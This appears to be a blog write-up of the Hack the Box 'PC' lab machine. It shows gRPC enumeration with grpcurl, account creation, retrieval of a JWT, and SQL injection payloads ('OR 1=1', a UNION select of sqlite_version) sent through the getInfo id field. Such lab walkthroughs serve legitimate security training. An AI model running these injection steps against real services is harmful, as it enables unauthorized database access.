--- 
title: "Hack the Box (HTB) - PC"
description: "Exploiting gRPC"
date: 2024-07-10 12:00:00 -100
image: /assets/images/HTB - PC/PCP-South.png
categories: [Vulnerability Assessment, Web Application]
tags: [arbitrary file upload, burp suite, client-side validation, container, insufficient password security, pentest report, sql injection, sqlmap, xss]    # TAG names should always be lowercase
---
*Cover image by [Freepik](https://www.freepik.com/)*

## Enumeration
First let's start by running enumeration on our IP `10.10.11.214` I like to use the tool [AutoRecon](https://github.com/Tib3rius/AutoRecon) as it vastly speeds up the enumeration process

```bash
sudo autorecon <ip>
```

Checking our `_full_tcp_nmap.txt` that autorecon generated for us. We see that ports `22` and `50051` are open

![Nmap Scan](assets/images/HTB - PC/Nmap scan.png)

Doing a quick good search tells us that port 50051 is typically associated with gRPC (Google Remote Procedure Calls) which essentially is a open source protocol that helps microservices communicate with each other

We can run the tool `grpc curl` to list the available services on a gRPC server

```bash
grpcurl -plaintext 10.10.11.214:50051 list
```

We see the following `SimpleApp` & `grpc.reflection.v1alpha.ServerReflection`

![grpc curl](/assets/images/HTB%20-%20PC/gRPC%20curl\).png)

We can run the folowing command against the service to identify RPC methods

```bash
grpcurl -plaintext 10.10.11.214:50051 describe SimpleApp
```

![grpc methods](/assets/images/HTB%20-%20PC/grpc%20methods.png)

We've successfully identified the following three service methods

- LoginUser
- RegisterUser
- getInfo

Before we can attempt to exploit these methods, we need to understand the structure of the request and response message for each method. We can use the the following command to accomplish this

```bash
# Describe Request and Response Types for "LoginUser"
grpcurl -plaintext 10.10.11.214:50051 describe .LoginUserRequest
grpcurl -plaintext 10.10.11.214:50051 describe .LoginUserResponse
```
![Request and response type](/assets/images/HTB%20-%20PC/Request%20and%20respones%20type.png)

Now that we have a detailed structure, we can craft a request and perform tests. Let's try to send data to the `RegisteredUser` endpoint in the form of creating an account

```bash
grpcurl -plaintext -d '{"username": "Jigsaw64", "password": "PleaseHireMe"}' 10.10.11.214:50051 SimpleApp.RegisterUser
```
![User Crated](/assets/images/HTB%20-%20PC/User%20created.png)

Account successfully created. Now let's login

```bash
grpcurl -plaintext -d '{"username": "Jigsaw64", "password": "PleaseHireMe"}' 10.10.11.214:50051 SimpleApp.LoginUser
```

![Login Successful](/assets/images/HTB%20-%20PC/ID%20333.png)

Login successful & our ID is `333` Now let's attempt to invoke the `getInfo` method with our ID
```bash
grpcurl -plaintext -d '{"id": "333"}' 10.10.11.214:50051 SimpleApp.getInfo
```

![Missing token header](/assets/images/HTB%20-%20PC/Missing%20Token%20header.png)

It looks like to call the getInfo method, we need a `token` header in our request. After some research I discoverd that adding the `-vv` flag for very verbose might provide us with more metadata on our request. Let's edit the `LoginUser` request and attempt it again

![Token Received](/assets/images/HTB%20-%20PC/Token%20Received.png)

Nice, we got our JSON Web Token (JWT). Now let's edit the `.getInfo` request with our token and try again

```bash
grpcurl -plaintext \
  -H "token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiSmlnc2F3NjQiLCJleHAiOjE3MjA3NTk0MTR9.wU1nEE4r0kiPpqfc9mX4u73Yip-eHy-HQyNXCVzGsao" \
  -d '{"id": "633"}' \
  -vv \
  10.10.11.214:50051 SimpleApp.getInfo
```
We see the following message `"Will update soon."`

![Will update soon](/assets/images/HTB%20-%20PC/Will%20update%20soon.png)

Let's try a basic SQL injection the ID parameter

```bash
grpcurl -plaintext \
  -H "token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiSmlnc2F3NjQiLCJleHAiOjE3MjA3NTk0MTR9.wU1nEE4r0kiPpqfc9mX4u73Yip-eHy-HQyNXCVzGsao" \
  -d '{"id": "555 OR 1=1"}' \
  -vv \
  10.10.11.214:50051 SimpleApp.getInfo
```
We get the reponse `"message": "The admin is working hard to fix the issues.`

It looks like our simple SQL injection payload worked. Instead of querying specifically for the ID of 555, it evaluated 1=1 to true, retraining data related to the admin message.

Let's trying querying for the DB version we're dealing with. 

```bash
grpcurl -plaintext \
  -H "token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiSmlnc2F3NjQiLCJleHAiOjE3MjA3NTk0MTR9.wU1nEE4r0kiPpqfc9mX4u73Yip-eHy-HQyNXCVzGsao" \
  -d '{"id": "555 union select sqlite_version()"}' \
  -vv \
  10.10.11.214:50051 SimpleApp.getInfo
```

We've confirmed that the method we're interacting with is querying a `SQLite` DB and that the version is `3.31.1`
